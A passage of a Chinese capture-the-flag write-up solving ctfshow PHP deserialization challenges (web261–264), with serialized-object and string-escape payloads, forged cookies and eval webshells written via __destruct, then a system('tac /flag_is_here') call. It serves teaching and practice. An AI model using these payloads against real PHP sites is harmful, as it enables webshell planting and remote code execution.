class="token operator">-></span><span class="token property">code</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php#language.oop5.magic.sleep">PHP 文档</a>中提到</p><blockquote><p>注意:<br>如果类中同时定义了<code> __unserialize()</code> 和 <code>__wakeup()</code> 两个魔术方法，则只有 <code>__unserialize()</code> 方法会生效，<code>__wakeup() </code>方法会被忽略。<br>注意:<br>此特性自 PHP 7.4.0 起可用。</p></blockquote><p>查看 <code>response header</code> 可知 <code>X-Powered-By: PHP/7.4.16</code>，那么 <code>__wakeup</code> 部分就不会被执行，与注释无异。<br><code>__destruct</code> 函数部分弱比较 <code>$this-&gt;code==0x36d</code>，因为 <code>$this-&gt;code = $this-&gt;username.$this-&gt;password;</code>，<code>username</code> 可控制，因为 <code>(int)&#39;877.php&#39; == 0x36d</code>，故传 <code>877.php</code> 即可绕过。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowvip</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'877.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST[1]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>vip<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A10<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfshowvip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22877.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A25<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">3</span>Fphp<span class="token operator">+</span><span class="token operator">%</span><span class="token number">40</span>eval<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">24</span>_POST<span class="token operator">%</span><span class="token number">5</span>B1<span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">3</span>F<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token constant">POST</span><span class="token punctuation">:</span> <span class="token operator">/</span><span class="token number">877.</span>php       <span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /flag_is_here'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="web262-反序列化字符串逃逸"><a href="#web262-反序列化字符串逃逸" class="headerlink" title="web262(反序列化字符串逃逸)"></a>web262(反序列化字符串逃逸)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$m</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$t</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'t'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$umsg</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fuck'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'loveU'</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$umsg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your message has been sent'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>message.php</p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>根据message.php提示，Cookie传入构造好的msg即可</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">msg=Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO047czozOiJtc2ciO047czoyOiJ0byI7TjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</span></span></code></pre><p>正确做法应该是运用<strong>反序列化字符串逃逸</strong>，运用的思想跟sql注入的闭合相似</p><p>我们这里有一个序列化字符串，我们要改变token属性，但我们无法直接控制它的值。</p><p>我们只能给from，msg，to传递值，即这三个属性是可控的</p><pre class="language-none"><code class="language-none">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:1:&quot;3&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code></pre><p>假如我们向to属性传递 <strong>t&#x3D;3”;s:5:”token”;s:5:”user”;}</strong> 字符串就变为了下面这样</p><pre class="language-none"><code class="language-none">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:27:&quot;3&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;user&quot;;&#125;</code></pre><p>我们对字符串进来了闭合，这样我们就可以控制token属性的值了，但我们也会发现一点，to属性值的长度变为了27。</p><p>反序列化时，如果为27则会匹配后面27个字符，这样闭合就没有效果。</p><p>这时候题目中的替换字符函数可以帮助到我们</p><pre class="language-none"><code class="language-none">$umsg &#x3D; str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));</code></pre><p>str_replace会将fuck替换为loveU，且替换是在序列化之后进行，也就是说，<strong>实际字符串长度增加了1，但标明的字符串长度任然为原值</strong></p><pre class="language-none"><code class="language-none">&#x2F;&#x2F; 替换前s:2:&quot;to&quot;;s:4:&quot;fuck&quot;;&#x2F;&#x2F; 替换后s:2:&quot;to&quot;;s:4:&quot;loveU&quot;;</code></pre><p>通过这种方法，我们就可以凭空增加字符，来成功进行闭合</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F; t&#x3D;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x2F;&#x2F; 后面多出27个字符，所以我们写27个fuck，替换为loveU后，增加了27个字符，来达到字符串逃逸</code></pre><p>最终我们的payload为</p><pre class="language-none"><code class="language-none">f&#x3D;1&amp;m&#x3D;2&amp;t&#x3D;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><h4 id="web263-Session反序列化"><a href="#web263-Session反序列化" class="headerlink" title="web263(Session反序列化)"></a>web263(Session反序列化)</h4><p>刚开始以为弱密码，但是成功，于是扫描到备份文件<code>www.zip</code></p><p>index.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//超过5次禁止登陆</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limti'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"登陆失败次数超过限制"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"limit"</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>inc.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$status</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">setStatus</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">status</span><span class="token operator">=</span><span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"log-"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"使用"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">.</span><span class="token string double-quoted-string">"登陆"</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">status</span><span class="token operator">?</span><span class="token string double-quoted-string">"成功"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"失败"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"----"</span><span class="token operator">.</span><span class="token function">date_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d H:i:s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>inc.php有file_put_contents，可写木马，user控制文件名，pass写一句话</p><pre class="language-php" data-language="php"><code class="language-php">session<span class="token operator">.</span>save_path<span class="token operator">=</span><span class="token string double-quoted-string">""</span> 指定储存的路径session<span class="token operator">.</span>save_handler<span class="token operator">=</span><span class="token string double-quoted-string">""</span> 指定储存时使用的函数（默认是file）session<span class="token operator">.</span>auto_start boolensession<span class="token operator">.</span>serialize_handler<span class="token operator">=</span><span class="token string double-quoted-string">""</span> 定义序列化和反序列化的处理器的名字，默认是<span class="token function">php</span><span class="token punctuation">(</span><span class="token number">5.5</span><span class="token number">.4</span>后改为php_serialize<span class="token punctuation">)</span></code></pre><p>使用 <code>ini_set</code> 指定了 <code>serialize_handler</code> 为 <code>php</code>，如果默认的 <code>serialize_handler</code> 为 <code>php_serialize</code>，就可以通过在序列化的字符串之前加 <code>|</code>，反序列化任意对象。</p><ul><li><p>php_binary: 存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</p></li><li><p>php: 存储方式是，键名+竖线+经过serialize()函数序列处理的值</p></li><li><p>php_serialize(php&gt;5.5.4): 存储方式是，经过serialize()函数序列化处理的值,会将键名和值当作一个数组序列化</p><blockquote><p>注意：在 <code>php 5.5.4</code> 以前默认选择的是 <code>php</code>，<code>5.5.4</code> 之后就是 <code>php_serialize</code>，这里的 <code>php</code> 版本为 <code>7.3.11</code>，那么默认就是 <code>php_serialize</code>。</p></blockquote></li></ul><p>那么思路就很清晰了，首先在index.php中的 <code>$COOKIE[&#39;limit&#39;]</code> 中构造 <code>|+序列化对象</code> 的字符串，访问首页写入 <code>session</code>，再通过 <code>check.php</code> 加载的 <code>inc.php</code> 中的 <code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code> 将 <code>session</code> 以 <code>session.serialize_handler=php</code> 的格式反序列化，执行 <code>User</code> 类的 <code>__destruct</code> 方法写 <code>shell</code>。<br>构造 <code>payload</code>：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"a.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php eval($_POST[1]);phpinfo();?>'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$status</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|"</span><span class="token operator">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">limit=fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiJhLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQ==</span></span></code></pre><p>访问index.php时修改Cookie并发送，然后访问check.php触发反序列化，最后在根目录下<code>/log-a.php</code>刚开始文件成功写入了，没法命令执行，木马后面加个<code>phpinfo()</code>就可以了，很奇怪</p><h4 id="web264-Session反序列化字符逃逸"><a href="#web264-Session反序列化字符逃逸" class="headerlink" title="web264(Session反序列化字符逃逸)"></a>web264(Session反序列化字符逃逸)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>这次相比 <code>web262</code> 有了 <code>session</code> 的限制，就不能自己构造了，用起来反序列化字符串逃逸。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span> <span class="token operator">=</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span> <span class="token operator">=</span> <span class="token string 